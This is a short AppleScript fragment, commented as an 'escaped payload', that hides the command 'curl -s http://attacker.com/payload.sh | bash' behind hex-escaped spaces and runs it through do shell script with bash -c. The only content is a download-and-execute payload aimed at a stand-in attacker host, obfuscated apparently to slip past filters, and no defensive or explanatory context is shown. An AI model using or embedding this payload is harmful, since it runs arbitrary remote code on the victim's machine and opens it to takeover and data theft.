-- Escaped payload using $'\x' sequences
set e to "curl\x20-s\x20http://attacker.com/payload.sh\x20|\x20bash"
do shell script "bash -c $'" & e & "'"
